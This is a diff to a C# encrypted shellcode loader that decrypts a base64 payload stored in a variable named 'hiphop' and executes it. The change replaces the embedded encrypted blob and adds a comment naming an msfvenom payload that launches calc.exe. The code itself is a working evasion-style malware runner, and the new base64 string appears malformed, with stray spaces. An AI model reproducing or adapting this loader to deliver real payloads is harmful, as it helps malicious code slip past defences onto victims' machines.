@@ -51,7 +51,7 @@ namespace goodTimes
                 // Encrypt and Encode the data:
                 byte[] e_data = Encrypt(data, key, iv);
                 String finalPayload = Convert.ToBase64String(e_data);
-                Console.WriteLine($"[i] Replace the hiphop variable with your new payload:\n\n\t String hiphop {finalPayload};");
+                Console.WriteLine($"[i] Replace the hiphop variable with your new payload:\n\n\t String hiphop = " + '"' + $"{finalPayload}" + '"' + ';');
 
                 Environment.Exit(0);
             }
@@ -64,8 +64,8 @@ namespace goodTimes
             // RUN PAYLOAD 
             else
             {
-                // REPLACE THIS WITH NEW PAYLOAD!!!
-                String hiphop = "kbIjKriCiXF6LhkMx/EAGTGjZHr80dARtzBLigPcEpjKP/9Bc+kiBeyOSeNBW+4skDUTGaTA77Yr7vjbzoQlBcZFaXduQJYuERWO5zU6RwQ2rvFGs2a0zJGo05Li0a1lgq+1KsMPF263MEq8BqcmSmx/czX/0c53vSDSDCPlGRuI/Qu9eN2YF0rH0F8MV7bob6vYt2NdLKYWvmpVqc2H6VSk5bXCtiTKDMg7cCOIIPzW/sPMFExrXh8P8K9Sbi3YHIDTIM/5iIrMe4o607++mdkGbXRS0xehJtePThk/Eue/mii7J+TAWngp7lIkAPrG7LuETOC5redvfU7HX/4RqB8kidarzycTRSAy35loXMihnRmSsClls6SwPUrhG78r";
+                // msfvenom -p windows/exe cmd=calc.exe -f csharp --> CHANGE ME!
+                String hiphop = "ZxOy1BksVfrlq8wcmyHY8GwwiBZd8NGrGQiKvx15hcv9sQ9apoO6NGbNBxAeS4NLHSz4owcdPgQTTejYJr80Ke4ynoy41yrc5RD0uqt1ppyxDAeYGATQy7xFbN247gwFee5cPZAFyBzbI6DvOLBFSJiP64kv5T7pX3iapVsX7ORmg7Ubfa1M9PcYNm5qzS9dyHxFdeD578YA6DGYC0UPzmeDXB11R0MWmPAkRGFftQp + YdurMHce1R4HC9bQ0gtm / MLHIP / UTPbIUtwrEAqQ / SYJcJCmeCPynYLNYrn9ae1xvCBokUTgdK + gpUa58ss2F4F60p1ujZNHmQ1Bn39WZmK5R4wSVmdFJpKRZXeGycAziEVlGjsS7XDKsvQvWvaZKqealuTWxH9q6n++zrRJZ0TBorjcFHKJZOLK5bNgKx0DbmFHXz + KBH400o";
 
                 byte[] de_data = Decrypt(Convert.FromBase64String(hiphop), key, iv);
                 nonsense(de_data);
